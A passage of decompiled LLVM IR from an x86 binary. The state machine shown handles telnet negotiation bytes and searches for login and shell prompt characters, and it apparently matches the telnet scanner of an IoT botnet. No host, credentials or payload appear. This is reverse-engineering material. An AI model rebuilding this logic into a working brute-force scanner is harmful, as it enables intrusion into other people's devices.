  store i32 %v1_8050f62, i32* %eax.global-to-local, align 4
  store i32 %v1_8050f62, i32* %v2_8050f5b, align 4
  %v0_8050f6a = load i32, i32* %eax.global-to-local, align 4
  %v1_8050f6a = add i32 %v0_8050f6a, -255
  %v6_8050f6a = sub i32 254, %v0_8050f6a
  %v7_8050f6a = and i32 %v6_8050f6a, %v0_8050f6a
  %v8_8050f6a = icmp slt i32 %v7_8050f6a, 0
  %v9_8050f6a = icmp eq i32 %v1_8050f6a, 0
  %v10_8050f6a = icmp slt i32 %v1_8050f6a, 0
  %v3_8050f6f = icmp ne i1 %v10_8050f6a, %v8_8050f6a
  %v4_8050f6f = or i1 %v9_8050f6a, %v3_8050f6f
  br i1 %v4_8050f6f, label %dec_label_pc_8050f12, label %dec_label_pc_8050f71

dec_label_pc_8050f76:                             ; preds = %dec_label_pc_8051024
  %v1_8050f76 = add i32 %v0_8051024, 24
  %v2_8050f76 = inttoptr i32 %v1_8050f76 to i32*
  %v3_8050f76 = load i32, i32* %v2_8050f76, align 4
  %v1_8050f79 = add i32 %v3_8050f76, -1
  store i32 %v1_8050f79, i32* %eax.global-to-local, align 4
  %tmp136 = icmp slt i32 %v1_8050f79, 1
  br i1 %tmp136, label %dec_label_pc_8050fb2.loopexit12.loopexit, label %dec_label_pc_8050f7e.preheader

dec_label_pc_8050f7e.preheader:                   ; preds = %dec_label_pc_8050f76
  %v7_8050f7e.pre = load i32, i32* @edx, align 4
  %v2_8050f7e = add i32 %v0_8051024, 28
  br label %dec_label_pc_8050f7e

dec_label_pc_8050f7e:                             ; preds = %dec_label_pc_8050f7e.preheader, %dec_label_pc_8050faf
  %v7_8050f7e = phi i32 [ %v7_8050f7e.pre, %dec_label_pc_8050f7e.preheader ], [ %v9_8050f7e, %dec_label_pc_8050faf ]
  %v0_80517a8 = phi i32 [ %v1_8050f79, %dec_label_pc_8050f7e.preheader ], [ %v1_8050faf, %dec_label_pc_8050faf ]
  %v3_8050f7e = add i32 %v2_8050f7e, %v0_80517a8
  %v4_8050f7e = inttoptr i32 %v3_8050f7e to i8*
  %v5_8050f7e = load i8, i8* %v4_8050f7e, align 1
  %v6_8050f7e = zext i8 %v5_8050f7e to i32
  %v8_8050f7e = and i32 %v7_8050f7e, -256
  %v9_8050f7e = or i32 %v6_8050f7e, %v8_8050f7e
  store i32 %v9_8050f7e, i32* %edx.global-to-local, align 4
  %v10_8050f82 = icmp eq i8 %v5_8050f7e, 58
  br i1 %v10_8050f82, label %dec_label_pc_80517a8, label %dec_label_pc_8050f8b

dec_label_pc_8050f8b:                             ; preds = %dec_label_pc_8050f7e
  %v10_8050f8b = icmp eq i8 %v5_8050f7e, 62
  br i1 %v10_8050f8b, label %dec_label_pc_80517a8, label %dec_label_pc_8050f94

dec_label_pc_8050f94:                             ; preds = %dec_label_pc_8050f8b
  %v10_8050f94 = icmp eq i8 %v5_8050f7e, 36
  br i1 %v10_8050f94, label %dec_label_pc_80517a8, label %dec_label_pc_8050f9d

dec_label_pc_8050f9d:                             ; preds = %dec_label_pc_8050f94
  %v10_8050f9d = icmp eq i8 %v5_8050f7e, 35
  br i1 %v10_8050f9d, label %dec_label_pc_80517a8, label %dec_label_pc_8050fa6

dec_label_pc_8050fa6:                             ; preds = %dec_label_pc_8050f9d
  %v10_8050fa6 = icmp eq i8 %v5_8050f7e, 37
  br i1 %v10_8050fa6, label %dec_label_pc_80517a8, label %dec_label_pc_8050faf

dec_label_pc_8050faf:                             ; preds = %dec_label_pc_8050fa6
  %v1_8050faf = add i32 %v0_80517a8, -1
  %v8_8050faf = icmp eq i32 %v1_8050faf, 0
  store i32 %v1_8050faf, i32* %eax.global-to-local, align 4
  %v1_8050fb0 = icmp eq i1 %v8_8050faf, false
  br i1 %v1_8050fb0, label %dec_label_pc_8050f7e, label %dec_label_pc_8050fb2.backedge

dec_label_pc_8050fb2.backedge:                    ; preds = %dec_label_pc_8051453.thread, %dec_label_pc_8050fb2.loopexit12.loopexit, %dec_label_pc_8051440, %dec_label_pc_80511ed, %dec_label_pc_8051375, %dec_label_pc_8051232, %dec_label_pc_8050faf
  %v0_8050fb2 = phi i32 [ %v0_8051024, %dec_label_pc_8050faf ], [ %v0_8051024, %dec_label_pc_8051232 ], [ %v0_8051024, %dec_label_pc_8051375 ], [ %v0_8051024, %dec_label_pc_80511ed ], [ %v0_8051024, %dec_label_pc_8051440 ], [ %v0_8050fb2.pre.pre, %dec_label_pc_8050fb2.loopexit12.loopexit ], [ %v0_8051024, %dec_label_pc_8051453.thread ]
  %v1_8050fb2 = add i32 %v0_8050fb2, 12
  %v2_8050fb2 = inttoptr i32 %v1_8050fb2 to i32*
  %v3_8050fb2 = load i32, i32* %v2_8050fb2, align 4
  store i32 %v3_8050fb2, i32* %eax.global-to-local, align 4
  %v1_8050fb5 = icmp eq i32 %v3_8050fb2, 0
  br i1 %v1_8050fb5, label %dec_label_pc_8050f5b, label %dec_label_pc_8050fb2.backedge.dec_label_pc_8050fb9_crit_edge

dec_label_pc_8050fb2.backedge.dec_label_pc_8050fb9_crit_edge: ; preds = %dec_label_pc_8050fb2.backedge
  %v1_8050fbc.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8050fb9

dec_label_pc_8050fb2.loopexit12.loopexit:         ; preds = %dec_label_pc_8051453, %dec_label_pc_8051185, %dec_label_pc_8051125, %dec_label_pc_8051024, %dec_label_pc_80516b6, %dec_label_pc_8051403, %dec_label_pc_805138a, %dec_label_pc_805134c, %dec_label_pc_805127d, %dec_label_pc_805163d, %dec_label_pc_80511f5, %dec_label_pc_805172f, %dec_label_pc_80511b0, %dec_label_pc_80517a8, %dec_label_pc_8050f76
  %v0_8050fb2.pre.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8050fb2.backedge

dec_label_pc_8050fb9:                             ; preds = %dec_label_pc_8050fb2.preheader, %dec_label_pc_8050fb2.backedge.dec_label_pc_8050fb9_crit_edge
  %v1_8050fbc = phi i32 [ %v1_8050fbc.pre, %dec_label_pc_8050fb2.backedge.dec_label_pc_8050fb9_crit_edge ], [ %v0_8050f4c, %dec_label_pc_8050fb2.preheader ]
  %v0_8050fb9 = phi i32 [ %v0_8050fb2, %dec_label_pc_8050fb2.backedge.dec_label_pc_8050fb9_crit_edge ], [ %v0_8050fb227, %dec_label_pc_8050fb2.preheader ]
  %v1_8050fb9 = add i32 %v0_8050fb9, 28
  store i32 %v1_8050fb9, i32* %eax.global-to-local, align 4
  %v2_8050fbc = add i32 %v1_8050fbc, 16
  %v3_8050fbc = inttoptr i32 %v2_8050fbc to i32*
  store i32 %v1_8050fb9, i32* %v3_8050fbc, align 4
  %v0_8050fc0 = load i32, i32* @edi, align 4
  %v1_8050fc0 = add i32 %v0_8050fc0, 24
  %v2_8050fc0 = inttoptr i32 %v1_8050fc0 to i32*
  %v3_8050fc0 = load i32, i32* %v2_8050fc0, align 4
  %v9_8050fc0 = icmp eq i32 %v3_8050fc0, 256
  br i1 %v9_8050fc0, label %dec_label_pc_8051577, label %dec_label_pc_8050fcd

dec_label_pc_8050fcd:                             ; preds = %dec_label_pc_8050fb9, %dec_label_pc_8051577
  %v0_8050fcd = load i32, i32* @esp, align 4
  %v1_8050fcd = add i32 %v0_8050fcd, 40
  %v2_8050fcd = inttoptr i32 %v1_8050fcd to i32*
  %v3_8050fcd = load i32, i32* %v2_8050fcd, align 4
  store i32 %v3_8050fcd, i32* %ecx.global-to-local, align 4
  %v1_8050fd1 = add i32 %v0_8050fcd, 16
  %v2_8050fd1 = inttoptr i32 %v1_8050fd1 to i32*
  %v3_8050fd1 = load i32, i32* %v2_8050fd1, align 4
  store i32 %v3_8050fd1, i32* %ebx.global-to-local, align 4
  store i32 256, i32* %eax.global-to-local, align 4
  %v1_8050fda = inttoptr i32 %v3_8050fcd to i32*
  store i32 0, i32* %v1_8050fda, align 4
  %v0_8050fe0 = load i32, i32* @edi, align 4
  %v1_8050fe0 = add i32 %v0_8050fe0, 24
  %v2_8050fe0 = inttoptr i32 %v1_8050fe0 to i32*
  %v3_8050fe0 = load i32, i32* %v2_8050fe0, align 4
  store i32 %v3_8050fe0, i32* %edx.global-to-local, align 4
  %v0_8050fe3 = load i32, i32* @esp, align 4
  %v1_8050fe3 = add i32 %v0_8050fe3, -4
  %v2_8050fe3 = inttoptr i32 %v1_8050fe3 to i32*
  store i32 16384, i32* %v2_8050fe3, align 4
  %v0_8050fe8 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050fe8 = load i32, i32* %edx.global-to-local, align 4
  %v2_8050fe8 = add i32 %v1_8050fe8, %v0_8050fe8
  store i32 %v2_8050fe8, i32* @ebx, align 4
  %v0_8050fea = load i32, i32* %eax.global-to-local, align 4
  %v2_8050fea = sub i32 %v0_8050fea, %v1_8050fe8
  store i32 %v2_8050fea, i32* %eax.global-to-local, align 4
  %v2_8050fec = add i32 %v0_8050fe3, -8
  %v3_8050fec = inttoptr i32 %v2_8050fec to i32*
  store i32 %v2_8050fea, i32* %v3_8050fec, align 4
  %v0_8050fed = load i32, i32* @ebx, align 4
  %v2_8050fed = add i32 %v0_8050fe3, -12
  %v3_8050fed = inttoptr i32 %v2_8050fed to i32*
  store i32 %v0_8050fed, i32* %v3_8050fed, align 4
  %v0_8050fee = load i32, i32* @edi, align 4
  %v1_8050fee = add i32 %v0_8050fee, 4
  %v2_8050fee = inttoptr i32 %v1_8050fee to i32*
  %v3_8050fee = load i32, i32* %v2_8050fee, align 4
  %v2_8050ff1 = add i32 %v0_8050fe3, -16
  %v3_8050ff1 = inttoptr i32 %v2_8050ff1 to i32*
  store i32 %v3_8050fee, i32* %v3_8050ff1, align 4
  %v0_8050ff2 = call i32 @function_805328e()
  store i32 %v0_8050ff2, i32* %eax.global-to-local, align 4
  %v0_8050ff7 = load i32, i32* @esp, align 4
  %v1_8050ff7 = add i32 %v0_8050ff7, 16
  %tmp137 = icmp slt i32 %v0_8050ff2, 1
  br i1 %tmp137, label %dec_label_pc_805150c, label %dec_label_pc_8051003

dec_label_pc_8051003:                             ; preds = %dec_label_pc_8050fcd
  store i32 0, i32* @edx, align 4
  br label %dec_label_pc_8051005

dec_label_pc_8051005:                             ; preds = %dec_label_pc_805100f, %dec_label_pc_8051003
  %v0_805100b = phi i32 [ %v1_805100f, %dec_label_pc_805100f ], [ 0, %dec_label_pc_8051003 ]
  %v1_8051005 = load i32, i32* @ebx, align 4
  %v2_8051005 = add i32 %v1_8051005, %v0_805100b
  %v3_8051005 = inttoptr i32 %v2_8051005 to i8*
  %v4_8051005 = load i8, i8* %v3_8051005, align 1
  %v5_8051005 = icmp eq i8 %v4_8051005, 0
  %v1_8051009 = icmp eq i1 %v5_8051005, false
  br i1 %v1_8051009, label %dec_label_pc_805100f, label %dec_label_pc_805100b

dec_label_pc_805100b:                             ; preds = %dec_label_pc_8051005
  store i8 65, i8* %v3_8051005, align 1
  %v0_805100f.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_805100f

dec_label_pc_805100f:                             ; preds = %dec_label_pc_8051005, %dec_label_pc_805100b
  %v0_805100f = phi i32 [ %v0_805100b, %dec_label_pc_8051005 ], [ %v0_805100f.pre, %dec_label_pc_805100b ]
  %v1_805100f = add i32 %v0_805100f, 1
  store i32 %v1_805100f, i32* @edx, align 4
  %v12_8051010 = icmp eq i32 %v0_8050ff2, %v1_805100f
  %v1_8051012 = icmp eq i1 %v12_8051010, false
  br i1 %v1_8051012, label %dec_label_pc_8051005, label %dec_label_pc_8051014

dec_label_pc_8051014:                             ; preds = %dec_label_pc_805100f, %dec_label_pc_8051512
  %v0_8051014 = load i32, i32* @edi, align 4
  %v1_8051014 = add i32 %v0_8051014, 24
  %v2_8051014 = inttoptr i32 %v1_8051014 to i32*
  %v3_8051014 = load i32, i32* %v2_8051014, align 4
  %v2_8051017 = add i32 %v3_8051014, %v0_8050ff2
  store i32 %v2_8051017, i32* @ebx, align 4
  %v0_8051019 = load i32, i32* @global_var_80572f0.34, align 16
  store i32 %v0_8051019, i32* %eax.global-to-local, align 4
  store i32 %v2_8051017, i32* %v2_8051014, align 4
  %v0_8051021 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051021 = load i32, i32* @edi, align 4
  %v2_8051021 = add i32 %v1_8051021, 8
  %v3_8051021 = inttoptr i32 %v2_8051021 to i32*
  store i32 %v0_8051021, i32* %v3_8051021, align 4
  br label %dec_label_pc_8051024

dec_label_pc_8051024:                             ; preds = %dec_label_pc_805132c, %dec_label_pc_8051014
  %v0_8051024 = load i32, i32* @edi, align 4
  %v1_8051024 = add i32 %v0_8051024, 12
  %v2_8051024 = inttoptr i32 %v1_8051024 to i32*
  %v3_8051024 = load i32, i32* %v2_8051024, align 4
  store i32 %v3_8051024, i32* %eax.global-to-local, align 4
  switch i32 %v3_8051024, label %dec_label_pc_8050fb2.loopexit12.loopexit [
    i32 2, label %dec_label_pc_8051034
    i32 3, label %dec_label_pc_80510c7
    i32 4, label %dec_label_pc_8051150
    i32 5, label %dec_label_pc_8050f76
    i32 6, label %dec_label_pc_80511f5
    i32 7, label %dec_label_pc_805134c
    i32 8, label %dec_label_pc_80511b0
    i32 9, label %dec_label_pc_8051403
    i32 10, label %dec_label_pc_8051240
  ]

dec_label_pc_8051034:                             ; preds = %dec_label_pc_8051024
  %v0_8051034 = load i32, i32* @esp, align 4
  %v1_8051034 = add i32 %v0_8051034, 16
  %v2_8051034 = inttoptr i32 %v1_8051034 to i32*
  %v3_8051034 = load i32, i32* %v2_8051034, align 4
  store i32 %v3_8051034, i32* @ebx, align 4
  store i32 0, i32* @ebp, align 4
  %v1_805103a = add i32 %v0_8051024, 24
  %v2_805103a = inttoptr i32 %v1_805103a to i32*
  %v3_805103a = load i32, i32* %v2_805103a, align 4
  store i32 %v3_805103a, i32* %edx.global-to-local, align 4
  %v2_805103d18 = sub i32 0, %v3_805103a
  %v10_805103d22 = and i32 %v3_805103a, %v2_805103d18
  %v11_805103d23 = icmp slt i32 %v10_805103d22, 0
  %v13_805103d25 = icmp slt i32 %v2_805103d18, 0
  %v2_805103f26 = icmp eq i1 %v13_805103d25, %v11_805103d23
  br i1 %v2_805103f26, label %dec_label_pc_8051453.thread, label %dec_label_pc_8051041.preheader

dec_label_pc_8051453.thread:                      ; preds = %dec_label_pc_8051034
  br label %dec_label_pc_8050fb2.backedge

dec_label_pc_8051041.preheader:                   ; preds = %dec_label_pc_8051034, %dec_label_pc_805103d.backedge
  %v0_80510bb126 = phi i32 [ %v0_80510bb128, %dec_label_pc_805103d.backedge ], [ %v0_8051024, %dec_label_pc_8051034 ]
  %v0_805144b119 = phi i32 [ %v0_805103d, %dec_label_pc_805103d.backedge ], [ 0, %dec_label_pc_8051034 ]
  %v5_8051053108 = phi i32 [ %v5_8051053109, %dec_label_pc_805103d.backedge ], [ 2, %dec_label_pc_8051034 ]
  %v1_805104d106 = phi i32 [ %v1_805103d, %dec_label_pc_805103d.backedge ], [ %v3_805103a, %dec_label_pc_8051034 ]
  %v0_8051046103 = phi i32 [ %v0_8051046104, %dec_label_pc_805103d.backedge ], [ %v0_8051034, %dec_label_pc_8051034 ]
  br label %dec_label_pc_8051041

dec_label_pc_8051041:                             ; preds = %dec_label_pc_8051041.preheader, %dec_label_pc_8051092
  %v0_80510bb129 = phi i32 [ %v0_80510bb126, %dec_label_pc_8051041.preheader ], [ %v0_80510a9, %dec_label_pc_8051092 ]
  %v0_805144b = phi i32 [ %v0_805144b119, %dec_label_pc_8051041.preheader ], [ %v0_80510af, %dec_label_pc_8051092 ]
  %v5_8051053 = phi i32 [ %v5_8051053108, %dec_label_pc_8051041.preheader ], [ %v0_80510a4, %dec_label_pc_8051092 ]
  %v1_805104d = phi i32 [ %v1_805104d106, %dec_label_pc_8051041.preheader ], [ %v3_80510a9, %dec_label_pc_8051092 ]
  %v0_8051460 = phi i32 [ %v0_8051046103, %dec_label_pc_8051041.preheader ], [ %v1_80510ac, %dec_label_pc_8051092 ]
  %v0_8051041 = load i32, i32* @ebx, align 4
  %v1_8051041 = inttoptr i32 %v0_8051041 to i8*
  %v2_8051041 = load i8, i8* %v1_8051041, align 1
  %v12_8051041 = icmp eq i8 %v2_8051041, -1
  %v1_8051044 = icmp eq i1 %v12_8051041, false
  br i1 %v1_8051044, label %dec_label_pc_80510b3, label %dec_label_pc_8051046

dec_label_pc_8051046:                             ; preds = %dec_label_pc_8051041
  %v1_8051046 = add i32 %v0_8051460, 16
  %v2_8051046 = inttoptr i32 %v1_8051046 to i32*
  %v3_8051046 = load i32, i32* %v2_8051046, align 4
  %v1_805104a = add i32 %v0_8051041, 1
  store i32 %v1_805104a, i32* @esi, align 4
  %v2_805104d = add i32 %v3_8051046, %v1_805104d
  store i32 %v2_805104d, i32* %ecx.global-to-local, align 4
  %tmp297 = icmp ugt i32 %v2_805104d, %v1_805104a
  br i1 %tmp297, label %dec_label_pc_8051053, label %dec_label_pc_80510b3

dec_label_pc_8051053:                             ; preds = %dec_label_pc_8051046
  %v2_8051053 = inttoptr i32 %v1_805104a to i8*
  %v3_8051053 = load i8, i8* %v2_8051053, align 1
  %v4_8051053 = zext i8 %v3_8051053 to i32
  %v6_8051053 = and i32 %v5_8051053, -256
  %v7_8051053 = or i32 %v4_8051053, %v6_8051053
  store i32 %v7_8051053, i32* %eax.global-to-local, align 4
  %v11_8051056 = icmp eq i8 %v3_8051053, -1
  br i1 %v11_8051056, label %dec_label_pc_8051448, label %dec_label_pc_805105e

dec_label_pc_805105e:                             ; preds = %dec_label_pc_8051053
  %v11_805105e = icmp eq i8 %v3_8051053, -3
  br i1 %v11_805105e, label %dec_label_pc_8051460, label %dec_label_pc_8051066

dec_label_pc_8051066:                             ; preds = %dec_label_pc_805105e
  %v1_8051066 = add i32 %v0_8051041, 2
  store i32 %v1_8051066, i32* %eax.global-to-local, align 4
  %tmp298 = icmp ugt i32 %v2_805104d, %v1_8051066
  br i1 %tmp298, label %dec_label_pc_805106d, label %dec_label_pc_80510b3

dec_label_pc_805106d:                             ; preds = %dec_label_pc_8051066, %dec_label_pc_8051a33, %dec_label_pc_8051a3b
  %v4_805106d = phi i32 [ %v6_80514de, %dec_label_pc_8051a33 ], [ %v1_8051066, %dec_label_pc_8051066 ], [ %v4_805106d.pre, %dec_label_pc_8051a3b ]
  %v0_805106d = load i32, i32* @esi, align 4
  %v1_805106d = inttoptr i32 %v0_805106d to i8*
  %v2_805106d = load i8, i8* %v1_805106d, align 1
  %v3_805106d = zext i8 %v2_805106d to i32
  %v5_805106d = and i32 %v4_805106d, -256
  %v6_805106d = or i32 %v3_805106d, %v5_805106d
  store i32 %v6_805106d, i32* %eax.global-to-local, align 4
  %v11_805106f = icmp eq i8 %v2_805106d, -3
  br i1 %v11_805106f, label %dec_label_pc_80514f5, label %dec_label_pc_8051077

dec_label_pc_8051077:                             ; preds = %dec_label_pc_80514e8, %dec_label_pc_805106d
  %v0_8051566 = phi i32 [ %v0_80514eb, %dec_label_pc_80514e8 ], [ %v0_805106d, %dec_label_pc_805106d ]
  %v0_8051077 = phi i32 [ %v6_80514eb, %dec_label_pc_80514e8 ], [ %v6_805106d, %dec_label_pc_805106d ]
  %v1_8051077 = trunc i32 %v0_8051077 to i8
  %v11_8051077 = icmp eq i8 %v1_8051077, -5
  br i1 %v11_8051077, label %dec_label_pc_8051566, label %dec_label_pc_805107f

dec_label_pc_805107f:                             ; preds = %dec_label_pc_8051077, %dec_label_pc_8051566
  %v5_805107f = phi i32 [ %v0_8051077, %dec_label_pc_8051077 ], [ %v5_805107f.pre, %dec_label_pc_8051566 ]
  %v0_805107f = load i32, i32* @ebx, align 4
  %v1_805107f = add i32 %v0_805107f, 2
  %v2_805107f = inttoptr i32 %v1_805107f to i8*
  %v3_805107f = load i8, i8* %v2_805107f, align 1
  %v4_805107f = zext i8 %v3_805107f to i32
  %v6_805107f = and i32 %v5_805107f, -256
  %v7_805107f = or i32 %v4_805107f, %v6_805107f
  store i32 %v7_805107f, i32* %eax.global-to-local, align 4
  %v11_8051082 = icmp eq i8 %v3_805107f, -3
  br i1 %v11_8051082, label %dec_label_pc_8051503, label %dec_label_pc_805108a

dec_label_pc_805108a:                             ; preds = %dec_label_pc_80514f5, %dec_label_pc_805107f
  %v0_805156e = phi i32 [ %v0_80514f8, %dec_label_pc_80514f5 ], [ %v0_805107f, %dec_label_pc_805107f ]
  %v0_805108a = phi i32 [ %v7_80514f8, %dec_label_pc_80514f5 ], [ %v7_805107f, %dec_label_pc_805107f ]
  %v1_805108a = trunc i32 %v0_805108a to i8
  %v11_805108a = icmp eq i8 %v1_805108a, -5
  br i1 %v11_805108a, label %dec_label_pc_805156e, label %dec_label_pc_8051092

dec_label_pc_8051092:                             ; preds = %dec_label_pc_805108a, %dec_label_pc_805156e, %dec_label_pc_8051503
  %v0_8051092 = load i32, i32* @esp, align 4
  %v1_8051092 = add i32 %v0_8051092, -4
  %v2_8051092 = inttoptr i32 %v1_8051092 to i32*
  store i32 16384, i32* %v2_8051092, align 4
  %v1_8051097 = add i32 %v0_8051092, -8
  %v2_8051097 = inttoptr i32 %v1_8051097 to i32*
  store i32 3, i32* %v2_8051097, align 4
  %v0_8051099 = load i32, i32* @ebx, align 4
  %v2_8051099 = add i32 %v0_8051092, -12
  %v3_8051099 = inttoptr i32 %v2_8051099 to i32*
  store i32 %v0_8051099, i32* %v3_8051099, align 4
  %v0_805109a = load i32, i32* @ebp, align 4
  %v1_805109a = add i32 %v0_805109a, 3
  store i32 %v1_805109a, i32* @ebp, align 4
  %v0_805109d = load i32, i32* @edi, align 4
  %v1_805109d = add i32 %v0_805109d, 4
  %v2_805109d = inttoptr i32 %v1_805109d to i32*
  %v3_805109d = load i32, i32* %v2_805109d, align 4
  store i32 %v3_805109d, i32* %edx.global-to-local, align 4
  %v0_80510a0 = load i32, i32* @ebx, align 4
  %v1_80510a0 = add i32 %v0_80510a0, 3
  store i32 %v1_80510a0, i32* @ebx, align 4
  %v2_80510a3 = add i32 %v0_8051092, -16
  %v3_80510a3 = inttoptr i32 %v2_80510a3 to i32*
  store i32 %v3_805109d, i32* %v3_80510a3, align 4
  %v0_80510a4 = call i32 @function_8053304()
  store i32 %v0_80510a4, i32* %eax.global-to-local, align 4
  %v0_80510a9 = load i32, i32* @edi, align 4
  %v1_80510a9 = add i32 %v0_80510a9, 24
  %v2_80510a9 = inttoptr i32 %v1_80510a9 to i32*
  %v3_80510a9 = load i32, i32* %v2_80510a9, align 4
  store i32 %v3_80510a9, i32* %edx.global-to-local, align 4
  %v0_80510ac = load i32, i32* @esp, align 4
  %v1_80510ac = add i32 %v0_80510ac, 16
  %v0_80510af = load i32, i32* @ebp, align 4
  %v2_80510af = sub i32 %v0_80510af, %v3_80510a9
  %v8_80510af = xor i32 %v0_80510af, %v3_80510a9
  %v9_80510af = xor i32 %v2_80510af, %v0_80510af
  %v10_80510af = and i32 %v9_80510af, %v8_80510af
  %v11_80510af = icmp slt i32 %v10_80510af, 0
  %v13_80510af = icmp slt i32 %v2_80510af, 0
  %v2_80510b1 = icmp eq i1 %v13_80510af, %v11_80510af
  br i1 %v2_80510b1, label %dec_label_pc_80510b3, label %dec_label_pc_8051041

dec_label_pc_80510b3:                             ; preds = %dec_label_pc_805103d.backedge, %dec_label_pc_8051066, %dec_label_pc_8051046, %dec_label_pc_8051092, %dec_label_pc_8051041, %dec_label_pc_8051460.dec_label_pc_80510b3.loopexit_crit_edge
  %v0_80510bb = phi i32 [ %v0_80514c4, %dec_label_pc_8051460.dec_label_pc_80510b3.loopexit_crit_edge ], [ %v0_80510a9, %dec_label_pc_8051092 ], [ %v0_80510bb129, %dec_label_pc_8051066 ], [ %v0_80510bb129, %dec_label_pc_8051046 ], [ %v0_80510bb129, %dec_label_pc_8051041 ], [ %v0_80510bb128, %dec_label_pc_805103d.backedge ]
  %v0_80510b3 = phi i32 [ %v0_80510b3.pre.pre, %dec_label_pc_8051460.dec_label_pc_80510b3.loopexit_crit_edge ], [ %v0_80510af, %dec_label_pc_8051092 ], [ %v0_805144b, %dec_label_pc_8051066 ], [ %v0_805144b, %dec_label_pc_8051046 ], [ %v0_805144b, %dec_label_pc_8051041 ], [ %v0_805103d, %dec_label_pc_805103d.backedge ]
  %tmp138 = icmp slt i32 %v0_80510b3, 1
  br i1 %tmp138, label %dec_label_pc_8051453, label %dec_label_pc_80510bb

dec_label_pc_80510bb:                             ; preds = %dec_label_pc_80510b3
  %v1_80510bb = add i32 %v0_80510bb, 12
  %v2_80510bb = inttoptr i32 %v1_80510bb to i32*
  store i32 3, i32* %v2_80510bb, align 4
  br label %dec_label_pc_8051321

dec_label_pc_80510c7:                             ; preds = %dec_label_pc_8051024
  %v1_80510c7 = add i32 %v0_8051024, 24
  %v2_80510c7 = inttoptr i32 %v1_80510c7 to i32*
  %v3_80510c7 = load i32, i32* %v2_80510c7, align 4
  store i32 %v3_80510c7, i32* %ecx.global-to-local, align 4
  %v1_80510ca = add i32 %v3_80510c7, -1
  store i32 %v1_80510ca, i32* %eax.global-to-local, align 4
  %tmp139 = icmp slt i32 %v1_80510ca, 1
  br i1 %tmp139, label %dec_label_pc_8051105, label %dec_label_pc_80510d1.preheader

dec_label_pc_80510d1.preheader:                   ; preds = %dec_label_pc_80510c7
  %v7_80510d1.pre = load i32, i32* @edx, align 4
  %v2_80510d1 = add i32 %v0_8051024, 28
  br label %dec_label_pc_80510d1

dec_label_pc_80510d1:                             ; preds = %dec_label_pc_80510d1.preheader, %dec_label_pc_8051102
  %v7_80510d1 = phi i32 [ %v7_80510d1.pre, %dec_label_pc_80510d1.preheader ], [ %v9_80510d1, %dec_label_pc_8051102 ]
  %v0_805159a = phi i32 [ %v1_80510ca, %dec_label_pc_80510d1.preheader ], [ %v1_8051102, %dec_label_pc_8051102 ]
  %v3_80510d1 = add i32 %v2_80510d1, %v0_805159a
  %v4_80510d1 = inttoptr i32 %v3_80510d1 to i8*
  %v5_80510d1 = load i8, i8* %v4_80510d1, align 1
  %v6_80510d1 = zext i8 %v5_80510d1 to i32
  %v8_80510d1 = and i32 %v7_80510d1, -256
  %v9_80510d1 = or i32 %v6_80510d1, %v8_80510d1
  store i32 %v9_80510d1, i32* %edx.global-to-local, align 4
  %v10_80510d5 = icmp eq i8 %v5_80510d1, 58
  br i1 %v10_80510d5, label %dec_label_pc_805159a, label %dec_label_pc_80510de

dec_label_pc_80510de:                             ; preds = %dec_label_pc_80510d1
  %v10_80510de = icmp eq i8 %v5_80510d1, 62
  br i1 %v10_80510de, label %dec_label_pc_805159a, label %dec_label_pc_80510e7

dec_label_pc_80510e7:                             ; preds = %dec_label_pc_80510de
  %v10_80510e7 = icmp eq i8 %v5_80510d1, 36
  br i1 %v10_80510e7, label %dec_label_pc_805159a, label %dec_label_pc_80510f0

dec_label_pc_80510f0:                             ; preds = %dec_label_pc_80510e7
  %v10_80510f0 = icmp eq i8 %v5_80510d1, 35
  br i1 %v10_80510f0, label %dec_label_pc_805159a, label %dec_label_pc_80510f9

dec_label_pc_80510f9:                             ; preds = %dec_label_pc_80510f0
  %v10_80510f9 = icmp eq i8 %v5_80510d1, 37
  br i1 %v10_80510f9, label %dec_label_pc_805159a, label %dec_label_pc_8051102

dec_label_pc_8051102:                             ; preds = %dec_label_pc_80510f9
  %v1_8051102 = add i32 %v0_805159a, -1
  %v8_8051102 = icmp eq i32 %v1_8051102, 0
  store i32 %v1_8051102, i32* %eax.global-to-local, align 4
  %v1_8051103 = icmp eq i1 %v8_8051102, false
  br i1 %v1_8051103, label %dec_label_pc_80510d1, label %dec_label_pc_8051105

dec_label_pc_8051105:                             ; preds = %dec_label_pc_8051102, %dec_label_pc_805159a, %dec_label_pc_80510c7
  %v0_8051105 = load i32, i32* @esp, align 4
  %v1_8051105 = add i32 %v0_8051105, -4
  %v2_8051105 = inttoptr i32 %v1_8051105 to i32*
  store i32 4, i32* %v2_8051105, align 4
  %v1_8051107 = add i32 %v0_8051105, -8
  %v2_8051107 = inttoptr i32 %v1_8051107 to i32*
  store i32 ptrtoint ([5 x i8]* @global_var_80556e5.46 to i32), i32* %v2_8051107, align 4
  %v0_805110c = load i32, i32* %ecx.global-to-local, align 4
  %v2_805110c = add i32 %v0_8051105, -12
  %v3_805110c = inttoptr i32 %v2_805110c to i32*
  store i32 %v0_805110c, i32* %v3_805110c, align 4
  %v1_805110d = add i32 %v0_8051105, 16
  %v2_805110d = inttoptr i32 %v1_805110d to i32*
  %v3_805110d = load i32, i32* %v2_805110d, align 4
  store i32 %v3_805110d, i32* %eax.global-to-local, align 4
  %v2_8051111 = add i32 %v0_8051105, -16
  %v3_8051111 = inttoptr i32 %v2_8051111 to i32*
  store i32 %v3_805110d, i32* %v3_8051111, align 4
  %v0_8051112 = call i32 @function_80526d0()
  store i32 %v0_8051112, i32* %eax.global-to-local, align 4
  %v0_8051117 = load i32, i32* @esp, align 4
  store i32 %v0_8051112, i32* @ebp, align 4
  %v10_805111c = icmp eq i32 %v0_8051112, -1
  %v1_805111f = icmp eq i1 %v10_805111c, false
  br i1 %v1_805111f, label %dec_label_pc_80515a6, label %dec_label_pc_8051125

dec_label_pc_8051125:                             ; preds = %dec_label_pc_8051105
  %v1_8051125 = add i32 %v0_8051117, 12
  %v2_8051125 = inttoptr i32 %v1_8051125 to i32*
  store i32 5, i32* %v2_8051125, align 4
  %v1_8051127 = add i32 %v0_8051117, 8
  %v2_8051127 = inttoptr i32 %v1_8051127 to i32*
  store i32 ptrtoint ([6 x i8]* @global_var_80556ea.47 to i32), i32* %v2_8051127, align 4
  %v0_805112c = load i32, i32* @edi, align 4
  %v1_805112c = add i32 %v0_805112c, 24
  %v2_805112c = inttoptr i32 %v1_805112c to i32*
